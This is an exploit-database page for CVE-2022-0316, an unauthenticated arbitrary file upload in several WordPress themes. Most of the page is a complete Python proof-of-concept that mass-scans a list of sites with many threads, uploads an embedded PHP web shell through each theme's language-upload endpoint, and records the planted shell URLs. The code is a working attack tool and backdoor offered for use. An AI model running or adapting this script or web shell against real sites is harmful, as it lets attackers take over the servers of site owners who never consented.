---
title: Wordpress Multiple themes - Unauthenticated Arbitrary File Upload
url: https://cxsecurity.com/issue/WLB-2023020022
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-02-13
fetch_date: 2025-10-04T06:27:38.447673
---

# Wordpress Multiple themes - Unauthenticated Arbitrary File Upload

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Wordpress Multiple themes - Unauthenticated Arbitrary File Upload** **2023.02.12**  **![dz](https://cert.cx/cxstatic/images/flags/dz.png) [kill\_the\_net](https://cxsecurity.com/author/kill_the_net/1/) **(DZ)** ![dz](https://cert.cx/cxstatic/images/flags/dz.png)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-0316](https://cxsecurity.com/cveshow/CVE-2022-0316/ "Click to see CVE-2022-0316")**  CWE: **[CWE-434](https://cxsecurity.com/cwe/CWE-434 "CWE-434")** | |

Wordpress Multiple themes - Unauthenticated Arbitrary File Upload
CVE-2022-0316 Unauthenticated Arbitrary File Upload in multiple themes from ChimpStudio and PixFill.
Themes Effected:
westand
footysquare
aidreform
statfort
club-theme
kingclub-theme
spikes
spikes-black
soundblast
bolster
rocky-theme
bolster-theme
theme-deejay
snapture
onelife
churchlife
soccer-theme
faith-theme
statfort-new
Full code: https://github.com/KTN1990/CVE-2022-0316\_wordpress\_multiple\_themes\_exploit
POC:
----------------------
#!/usr/bin/env python3
# -\*- coding: utf-8 -\*
from argparse import ArgumentParser
from random import getrandbits
from concurrent.futures import ThreadPoolExecutor
from threading import Lock
from requests import Session
\_\_import\_\_('warnings').simplefilter('ignore',Warning)
class CVE\_2022\_0316:
def Save(self, file, data):
with self.Lock:
with open(file, 'a') as f:
f.write(f"{data}\n")
def Exploit(self, url):
name = f"{getrandbits(32)}.php"
r = self.session.post(url, files={"mofile[]": (name, self.shell)}).text
if "New Language Uploaded Successfully" in r:
print(f" [ LOG ] (SHELL UPLOADED) {url}")
self.Save("\_\_shells\_\_.txt", url.replace("include/lang\_upload.php",f"languages/{name}"))
return 1
print(f" [ LOG ] (SHELL NOT UPLOADED) {url}")
def Scan(self, url):
url = f"{'http://' if not url.lower().startswith(('http://', 'https://')) else ''}{url}{'/' if not url.endswith('/') else ''}"
print(f" [ LOG ] (CHECKING) {url}")
try:
for path in self.paths:
r = self.session.get(f"{url}wp-content/themes/{path}/include/lang\_upload.php").text
if 'Please select Mo file' in r:
url = f"{url}wp-content/themes/{path}/include/lang\_upload.php"
print(f" [ LOG ] (VULN) {url}")
self.Save("\_\_vuln\_\_.txt", url)
return self.Exploit(url)
print(f" [ LOG ] (NOT VULN) {url}")
except:
print(f" [LOG] EXCEPTION ERROR ({url})")
def \_\_init\_\_(self, Lock):
self.Lock = Lock
self.paths= ["westand","footysquare","aidreform","statfort","club-theme",
"kingclub-theme","spikes","spikes-black","soundblast",
"bolster","rocky-theme","bolster-theme","theme-deejay",
"snapture","onelife","churchlife","soccer-theme",
"faith-theme","statfort-new"]
self.shell= '''<?php error\_reporting(0);echo("kill\_the\_net<form method='POST' enctype='multipart/form-data'><input type='file'name='f' /><input type='submit' value='up' /></form>");@copy($\_FILES['f']['tmp\_name'],$\_FILES['f']['name']);echo("<a href=".$\_FILES['f']['name'].">".$\_FILES['f']['name']."</a>");?>'''
self.session = Session()
self.session.verify = False
self.session.timeout = (20,40)
self.session.allow\_redirects = True
self.session.max\_redirects = 5
self.session.headers.update({"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 13\_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"})
if \_\_name\_\_ == '\_\_main\_\_':
print('''
db d8b db d8888b. d88888b db db d8888b.
88 I8I 88 88 `8D 88' `8b d8' 88 `8D
88 I8I 88 88oodD' 88ooooo `8bd8' 88oodD'
Y8 I8I 88 88~~~ 88~~~~~ .dPYb. 88~~~
`8b d8'8b d8' 88 88. .8P Y8. 88
`8b8' `8d8' 88 Y88888P YP YP 88
KTN
''')
parser = ArgumentParser()
parser.add\_argument('-l', '--list', help="Path of list site", required=True)
parser.add\_argument('-t', '--threads', type=int, help="threads number", default=100)
args = parser.parse\_args()
try:
with open(args.list, 'r') as f: urls = list(set(f.read().splitlines()))
ExpObj = CVE\_2022\_0316(Lock())
with ThreadPoolExecutor(max\_workers=int(args.threads)) as pool:
[pool.submit(ExpObj.Scan, url) for url in urls]
except Exception as e:
print(e)
print(" [LOG] EXCEPTION ERROR @ MAIN FUNC")

**##### References:**

https://github.com/KTN1990/CVE-2022-0316\_wordpress\_multiple\_themes\_exploit

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023020022)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top